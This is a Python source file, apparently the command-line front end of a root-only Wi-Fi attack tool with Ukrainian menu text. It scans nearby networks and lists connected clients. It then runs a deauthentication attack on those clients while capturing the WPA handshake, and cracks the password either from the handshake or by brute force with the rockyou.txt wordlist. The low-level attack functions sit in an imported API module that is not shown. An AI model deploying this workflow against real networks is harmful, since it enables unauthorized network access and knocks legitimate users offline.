"""Entry-point CLI application that wires API and coloured console menus."""
import os
import sys
import menu
import time
from typing import List
from consolemenu import SelectionMenu
from airapi import API
from threading import Thread


class CLI:
    def __init__(self) -> None:
        # root-check
        if os.geteuid() != 0:
            menu.show_message("Run it as sudo.", "Permission error")
            sys.exit(1)

        self.api = API()
        self.current_device: str | None = None      # wlan0mon, …
        self.selected_network: dict | None = None   # результат scan_network

        self._base_options: List[str] = [
            "Choice Wireless Device",
            "Scan Network",
        ]

    # ──────────────────────────────────────────────────────────────────────
    #   Main loop
    # ──────────────────────────────────────────────────────────────────────
    def run(self) -> None:
        while True:
            # будуємо меню динамічно
            options = self._base_options.copy()
            if self.selected_network:
                display = self.selected_network["ssid"] or self.selected_network["bssid"]
                options.append(display)

            choice = menu.choose_main_action(options)
            if choice == 0:
                self._select_device()
            elif choice == 1:
                self._scan_network()
            elif self.selected_network and choice == 2:
                self._network_actions()

    # ──────────────────────────────────────────────────────────────────────
    #   Actions
    # ──────────────────────────────────────────────────────────────────────
    def _select_device(self) -> None:
        devs = self.api.get_wireless_devices()
        idx = menu.choose_device(devs)
        if idx in (-1, None):
            return
        self.current_device = devs[idx]
        menu.show_message(f"✅ Поточний інтерфейс: {self.current_device}", "Готово")

    def _scan_network(self) -> None:
        if not self.current_device:
            menu.show_message(
                "❗ Спочатку виберіть інтерфейс через 'Choice Wireless Device'.",
                "Помилка",
            )
            return

        try:
            nets = self.api.scan_network(self.current_device, timeout=6)
        except RuntimeError as err:
            menu.show_message(str(err), "Помилка")
            return

        if not nets:
            menu.show_message("😔 Мереж не знайдено.", "Результат")
            return

        options = [
            f"{n['ssid'] or '<hidden>'} | {n['bssid']} | ch {n['channel']} | "
            f"{n['encryption']} | {n['power']} dBm"
            for n in nets
        ]
        idx = SelectionMenu.get_selection(options, title="Знайдені мережі (оберіть одну)")
        if idx in (-1, None):
            return

        self.selected_network = nets[idx]
        menu.show_message(
            f"🌐 Обрано: {self.selected_network['ssid'] or '<hidden>'}",
            "Готово",
        )

    # ──────────────────────────────────────────────────────────────────────
    #   Network submenu
    # ──────────────────────────────────────────────────────────────────────
    def _network_actions(self) -> None:
        while True:
            act = SelectionMenu.get_selection(
                ["Show info", "Back"],
                title=f"Дії з {self.selected_network['ssid'] or self.selected_network['bssid']}",
            )
            if act in (-1, 1, None):
                return
            if act == 0:
                self._show_selected_info()


    def _show_selected_info(self) -> None:
        try:
            info = self.api.get_info_by_bssid(self.selected_network["bssid"])
        except ValueError as err:
            menu.show_message(str(err), "Error")
            return

        info = "\n".join(f"{k}: {v}" for k, v in info.items())
        chose = menu.choose_device_actions(info)
        if chose == 0:
            self._connect()
        elif chose == 1:
            self._brute_force()

    def _brute_force(self):
        try:
            print("Starting brute force with rockyou.txt...")
            password = self.api.brute_force_password(self.selected_network["bssid"])
            if password:
                menu.show_message(f"Password found: {password}", "Success!")
            else:
                menu.show_message("Password not found in rockyou.txt", "Result")
        except Exception as e:
            menu.show_message(str(e), "Error")

    def print_clients(self, clients):
        text = "{:<20} {:<20} {:<10} {:<10}".format("MAC Address", "Connected to", "Power", "Packets")
        text = f"{text}\n{'-'*60}\n"
        for client in clients:
            text2 = "{:<20} {:<20} {:<10} {:<10}".format(
                client['station'],
                client['bssid'],
                client['power'],
                client['packets']
            )
            text = f"{text}\n{text2}"
        menu.show_message(text, "Connected clients")
    def _connect(self):
        clients = self.api.get_connected_clients(interface=self.current_device)
        if len(clients) < 2:
            menu.show_message("Clients not found", "Error")
            exit(0)
        
        # Запускаємо потік для збору handshake
        getting_handshake = Thread(
            target=self.api.get_handshake,
            kwargs={
                "interface": self.current_device,
                "channel": self.selected_network["channel"],
                "bssid": self.selected_network["bssid"],
            }
        )
        getting_handshake.start()
        
        # Чекаємо 5 секунд перед запуском деаутентифікації
        time.sleep(5)
        
        # Запускаємо потік для деаутентифікації клієнтів
        disconnecting_clients = Thread(
            target=self.api.deauth_clients,
            kwargs={
                "interface": self.current_device,
                "router_bssid": self.selected_network["bssid"],
                "clients": [client["station"] for client in clients],
            }
        )
        disconnecting_clients.start()
        
        # Очікуємо завершення обох потоків
        try:
            while getting_handshake.is_alive() or disconnecting_clients.is_alive():
                print("Getting handshake...", end='\r')
                time.sleep(1)
            
            print("stop death clients")
            disconnecting_clients.join(timeout=1)        
            print("\nOperation completed successfully!")
            print(f"Start parsing password for {self.selected_network["ssid"]}")
            self.api.parse_password(router_bssid=self.selected_network["bssid"], router_ssid=self.selected_network["ssid"])
            
        except KeyboardInterrupt:
            print("\nOperation interrupted by user")
            getting_handshake.join(timeout=1)
            disconnecting_clients.join(timeout=1)
            return False
        
        return True
            


# ───────────────────────────────────────────────────────────────────────────
if __name__ == "__main__":
    CLI().run()
